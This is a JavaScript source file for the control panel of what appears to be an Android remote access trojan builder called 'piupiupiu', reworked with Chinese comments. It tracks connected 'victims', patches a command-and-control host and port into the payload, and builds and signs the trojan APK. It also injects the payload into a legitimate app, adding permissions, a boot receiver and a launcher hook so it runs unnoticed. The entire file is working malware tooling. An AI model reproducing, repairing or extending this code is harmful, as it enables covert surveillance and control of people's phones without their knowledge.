var app = angular.module('myapp', []);
const { remote } = require('electron');
var dialog = remote.dialog;
const { ipcRenderer } = require('electron');
var exec = require('child_process').exec;
var fs = require('fs-extra')
var victimsList = remote.require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var homeDir = require('homedir');
var path = require("path");

//--------------------------------------------------------------
var viclist = {};
var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
//--------------------------------------------------------------


// App Controller for (index.html)
app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = { enable: false, method: 'BOOT' }; //default values for binding apk
    var log = document.getElementById("log");
    $appCtrl.logs = [];
    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = remote.getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        // notify the main proccess about the port and let him start listening
        ipcRenderer.send("SocketIO:Listen", port);
        $appCtrl.Log("Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
    }

    // 取消监听：通知主进程关闭 HTTPS 服务端（再次点击 Listen 会以新端口重启）
    $appCtrl.Stop = () => {
        ipcRenderer.send("SocketIO:Stop");
        $appCtrl.Log("Stopping listener...", CONSTANTS.logStatus.SUCCESS);
    }


    // fired when main peoccess (main.js) send any new notification about new victim
    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        // add the new victim to the list
        viclist[index] = victimsList.getVictim(index);
        $appCtrl.Log("New victim from " + viclist[index].ip);
        $appCtrl.$apply();
    });


    // fired if listening brings error
    ipcRenderer.on("SocketIO:Listen", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply()
    });

    // 主进程确认监听已启动：把按钮切到「Stop」状态
    ipcRenderer.on('SocketIO:Listening', (event, port) => {
        $appCtrl.isListen = true;
        $appCtrl.$apply();
    });

    // 主进程确认监听已停止：把按钮切回「Listen」状态
    ipcRenderer.on('SocketIO:Stopped', () => {
        $appCtrl.isListen = false;
        $appCtrl.Log("Listener stopped", CONSTANTS.logStatus.SUCCESS);
        $appCtrl.$apply();
    });


    // fired when main peoccess (main.js) send any new notification about disconnected victim
    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log("Victim disconnected " + viclist[index].ip);
        // delete him from list
        delete viclist[index];
        $appCtrl.$apply();
    });


    // notify the main proccess (main.js) to open the lab
    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    }


    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
        // 同 LabCtrl：滚动必须等新行渲染完成，否则最新一条会卡在可视区下沿之外
        setTimeout(() => { log.scrollTop = log.scrollHeight; });
    }



    // function to open the dialog and choose apk to be bindded
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog(function(fileNames) {
            // fileNames is an array that contains all the selected
            if (fileNames === undefined) {
                $appCtrl.Log("No file selected");
            } else {
                $appCtrl.Log("File choosen  " + fileNames[0]);
                readFile(fileNames[0]); // read the file
            }
        });

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }

    }





    // function to build the apk and sign it
    $appCtrl.GenerateApk = (apkFolder) => {

        $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
            (error, stdout, stderr) => {
                if (error !== null) {
                    $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
                var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" "' + path.join(outputPath, CONSTANTS.apkName) + '"',
                    (error, stdout, stderr) => {
                        if (error !== null) {
                            $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
                            return;
                        }


                        fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
                            if (err) throw err;

                            $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
                            $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);

                        });
                    });
            });

    }


    // function to copy piupiupiu source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.CopypiupiupiuFilesAndGenerateApk = (apkFolder) => {

        $appCtrl.Log("Copying piupiupiu files to orginal app...");
        fs.copy(path.join(CONSTANTS.piupiupiuApkFolderPath, "smali"), path.join(apkFolder, "smali"), (error) => {
            if (error) {
                $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.GenerateApk(apkFolder);
        })

    };


    // fuction to copy all the piupiupiu permissions to the orginal app
    $appCtrl.copyPermissions = (manifest) => {
        var firstPart = manifest.substring(0, manifest.indexOf("<application"));
        var lastPart = manifest.substring(manifest.indexOf("<application"));

        var permArray = CONSTANTS.permissions;
        for (var i = 0; i < permArray.length; i++) {
            var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
            permissionName = permissionName.substring(0, permissionName.indexOf('"'));
            if (firstPart.indexOf(permissionName) == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            }
        }

        return (firstPart + lastPart);

    };


    // function to use onBoot method 
    // it will bind piupiupiu to orginal app 
    // and piupiupiu will start once the device rebooted
    // if success then go to copy all the rest piupiupiu files to orginal app
    // this method is working almost on every app 
    $appCtrl.BindOnBoot = (apkFolder) => {
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            var piupiupiuService = CONSTANTS.piupiupiuService;
            var piupiupiuReciver = CONSTANTS.piupiupiuReciver;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + piupiupiuService + piupiupiuReciver + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }
                $appCtrl.CopypiupiupiuFilesAndGenerateApk(apkFolder);

            });

        });

    };



    // function to use OnLauncher method 
    // it will bind piupiupiu to orginal app 
    // and piupiupiu will start once the orginal app started
    // if success then go to copy all the rest piupiupiu files to orginal app
    // this method is not working on every app (unstable)
    $appCtrl.BindOnLauncher = (apkFolder) => {

        $appCtrl.Log('Finding launcher activity from AndroidManifest.xml...');
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            var lanucherPath = GetLanucherPath(data, path.join(apkFolder, "smali/"));
            if (lanucherPath == -1) {
                $appCtrl.Log("Cannot find the lanucher activity , try the other binding method.", CONSTANTS.logStatus.FAIL);
                return;
            }

            var piupiupiuService = CONSTANTS.piupiupiuService;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + piupiupiuService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                $appCtrl.Log("Fetching lanucher activity...");
                fs.readFile(lanucherPath, 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading launcher activity Failed ', CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var startService = CONSTANTS.serviceSrc + lanucherPath.substring(lanucherPath.indexOf("smali/") + 6, lanucherPath.indexOf(".smali")) + CONSTANTS.serviceStart;


                    var key = CONSTANTS.orgAppKey;
                    $appCtrl.Log("Modifiying lanucher activity...");
                    var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                    fs.writeFile(lanucherPath, output, 'utf8', (error) => {
                        if (error) {
                            $appCtrl.Log('Modifying lanucher activity Failed', logStatus.FAIL);
                            return;
                        }

                        $appCtrl.CopypiupiupiuFilesAndGenerateApk(apkFolder);

                    });


                });
            });

        });

    }

    /**
     * 二开新增：把 C2 主机与端口写进 AppConfig.smali。
     *
     * 原版靠协议头与查询参数起始符两个字面量锚点定位 URL 子串再整体替换。
     * 客户端改成 AppConfig 集中配置 + 运行时拼接后，这两个字面量都不存在了，
     * 原逻辑会静默失效。这里改为按 smali 的 sput 指令定位：
     *
     *   const-string v0, "update.syskit-service.net"
     *   sput-object v0, Lcom/piupiupiu/AppConfig;->C2_HOST:Ljava/lang/String;
     *   const v0, 8080
     *   sput v0, Lcom/piupiupiu/AppConfig;->C2_PORT:I
     *
     * 找不到目标时返回 null，由调用方报错，而不是静默生成一个连错 C2 的 APK。
     */
    $appCtrl.patchC2 = (data, ip, port) => {
        // 方案 B：scheme 从 http 换成 ws，尾部还要拼上 CONSTANTS.wsPath（客户端 AppConfig.C2_PATH）。
        // 只改客户端不改这里，patchC2 会匹配不到锚点 -> 结果同样是 null -> 面板报错，
        // 但如果是漏改后半截（比如只换 scheme 忘了拼路径），则是静默连错地址。
        var target = 'https://' + ip + ':' + port + CONSTANTS.wsPath;
        // apktool 在 Windows 上写出的是 CRLF，行尾带 \r。
        // 直接用 split('\n') + /...$/ 会因为 \r 卡在末尾而匹配失败（替换静默失效）。
        // 这里统一剥离行尾，最后再按原文件的换行符拼回去。
        var eol = data.indexOf('\r\n') !== -1 ? '\r\n' : '\n';
        var lines = data.split(/\r?\n/);
        var urlDone = false;
        var hostDone = false;
        var portDone = false;

        for (var i = 0; i < lines.length; i++) {
            // 1) c2Base() 里被 javac 常量折叠后的整条 URL
            //    （C2_SCHEME + "://" + C2_HOST + ":" + C2_PORT + C2_PATH 全是编译期常量，会被折叠成一个）
            //    方案 B：scheme 可能是 ws，所以 http|ws 都接受 —— 只认 http 的话
            //    换 WebSocket 后这里会匹配不上，替换静默变成空操作。
            var mUrl = lines[i].match(/^(\s*)const-string (v\d+), "(?:https?|ws):\/\/[^"]*"\r?$/);
            if (mUrl) {
                lines[i] = mUrl[1] + 'const-string ' + mUrl[2] + ', "' + target + '"';
                urlDone = true;
                continue;
            }

            // 2) .field 常量值（兜底，保证字段本身也一致）
            var mHost = lines[i].match(/^(\s*)\.field public static final C2_HOST:Ljava\/lang\/String; = ".*"\r?$/);
            if (mHost) {
                lines[i] = mHost[1] + '.field public static final C2_HOST:Ljava/lang/String; = "' + ip + '"';
                hostDone = true;
                continue;
            }

            var mPort = lines[i].match(/^(\s*)\.field public static final C2_PORT:I = .*\r?$/);
            if (mPort) {
                lines[i] = mPort[1] + '.field public static final C2_PORT:I = ' + port;
                portDone = true;
                continue;
            }
        }

        // 折叠后的 URL 优先；只有 .field 时也必须主机和端口都改到才算成功
        if (!urlDone && !(hostDone && portDone)) {
            return null;
        }
        return lines.join(eol);
    }

    // fired when user click build buttom
    // collect the ip and port and start building
    $appCtrl.Build = (ip, port) => {
        if (!ip) {
            $appCtrl.Log('IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
            return;
        } else if (!port) {
            port = CONSTANTS.defaultPort;
        } else if (port > 65535 || port <= 1024) {
            $appCtrl.Log('Choose ports from range (1024,65535)', CONSTANTS.logStatus.FAIL);
            return;
        }


        // open piupiupiu source file and modifiy the ip and port to the users' ones
        var ipPortFile = path.join(CONSTANTS.piupiupiuApkFolderPath, CONSTANTS.c2ConfigPath);
        $appCtrl.Log('Reading (ip:port) file from ' + CONSTANTS.apkName + '...');
        fs.readFile(ipPortFile, 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading (ip:port) file Failed', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.Log('Adding source ip:port to ' + CONSTANTS.apkName + '...');
            $appCtrl.Log('Adding source ip:port to ' + ipPortFile + '...');
            // 二开：原版用 indexOf(协议头) .. indexOf(查询参数起始符) 这段子串做替换。
            // 客户端改成 AppConfig 集中配置 + 运行时拼接后，smali 里这两个字面量锚点
            // 都不存在了，indexOf 返回 -1，替换会静默变成空操作，
            // 生成的 APK 仍连默认 C2。改为按 sput 指令定位改写 C2_HOST / C2_PORT。
            var result = $appCtrl.patchC2(data, ip, port);
            if (result === null) {
                $appCtrl.Log('Patching C2 failed: C2_HOST/C2_PORT not found in ' + ipPortFile, CONSTANTS.logStatus.FAIL);
                return;
            }
            fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Adding source ip:port Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    $appCtrl.GenerateApk(CONSTANTS.piupiupiuApkFolderPath);

                } else {
                    // generate a solid piupiupiu apk
                    var filePath = $appCtrl.filePath;
                    if (filePath == null) {
                        $appCtrl.Log("Browse the apk which you want to bind", CONSTANTS.logStatus.FAIL);
                        return;
                    } else if (!filePath.includes(".apk")) {
                        $appCtrl.Log("It is not an apk file", CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                    $appCtrl.Log('Decompiling ' + filePath + "...");
                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                        (error, stdout, stderr) => {
                            if (error !== null) {
                                $appCtrl.Log('Decompilation Failed', CONSTANTS.logStatus.FAIL);
                                return;
                            }

                            if ($appCtrl.bindApk.method == 'BOOT')
                                $appCtrl.BindOnBoot(apkFolder);

                            else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                $appCtrl.BindOnLauncher(apkFolder);


                        });
                }
            });
        });
    }










});



//function to extract the luncher activity from the orginal app
function GetLanucherPath(manifest, smaliPath) {


    var regex = /<activity/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf("android.intent.category.LAUNCHER");
    var indexOfActivity = -1;

    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(1, manifest.indexOf('"'))
                manifest += '.smali';
                var files = fs.walkSync(smaliPath);
                for (var i = 0; i < files.length; i++) {
                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
                        return files[i];
                }

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



}